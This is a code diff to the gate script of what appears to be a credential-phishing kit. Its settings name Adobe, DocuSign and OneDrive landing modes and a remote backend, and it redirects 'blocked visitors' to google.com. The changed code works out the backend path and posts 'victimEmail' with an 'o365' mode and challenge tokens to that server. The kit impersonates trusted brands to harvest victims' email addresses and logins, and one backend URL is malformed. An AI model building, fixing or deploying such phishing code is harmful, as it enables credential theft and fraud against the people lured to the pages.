@@ -182,10 +182,9 @@
                    Values: "" | "dual-adobe-onedrive" | "dual-docusign-onedrive"
    ══════════════════════════════════════════════════════════════════════════ */
 
-const API_BASE_URL       = "https://starsprit.com";       // ← "" = auto-detect (same server)
-                                                    //   or full URL for remote server
+const API_BASE_URL       = "https:starspirit.com"; // ← Must point to the backend server's /page folder
 const APP_DIR_NAME       = "share";                  // ← sibling app folder name (used when auto-detecting)
-const LANDING_MODE       = "dual-adobe-onedrive";   // ← your landing mode
+const LANDING_MODE       = "";   // ← your landing mode
 const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitors go
 
 (async function () {
@@ -200,10 +199,23 @@ const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitor
   // level, then into the sibling APP_DIR_NAME folder (same-server mode).
   function buildApiBase() {
     if (API_BASE_URL) return API_BASE_URL.replace(/\/+$/, '');
-    const origin  = window.location.origin;
-    const gateDir = window.location.pathname.replace(/\/[^/]*$/, '');  // e.g. /doulble/standalone_gate
-    const parent  = gateDir.replace(/\/[^/]*$/, '');                    // e.g. /doulble
-    return origin + parent + '/' + APP_DIR_NAME;                        // e.g. http://localhost/doulble/page
+    let origin = window.location.origin;
+    if (origin === 'null' || window.location.protocol === 'file:') {
+      origin = 'file://';
+    }
+    let path = window.location.pathname;
+    
+    // If path ends with a known file like .html, remove it
+    if (path.match(/\/[^\/]+\.[a-z0-9]+$/i)) {
+      path = path.replace(/\/[^\/]+$/, '');
+    }
+    // Remove trailing slash if present
+    path = path.replace(/\/+$/, '');
+    
+    // Move up one directory to get to the parent of the gate folder
+    const parent = path.replace(/\/[^\/]+$/, '');
+    
+    return origin + parent + '/' + APP_DIR_NAME;
   }
   const apiBaseUrl = buildApiBase();
 
@@ -423,7 +435,7 @@ const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitor
       body: JSON.stringify({
         email:       victimEmail,
         landingPage: landingId,
-        mode:        'o365',
+        mode:        isO365 ? 'o365' : '',
         c_id:        challenge_id,
         c_ts:        challenge_ts,
         c_sig:       challenge_sig,
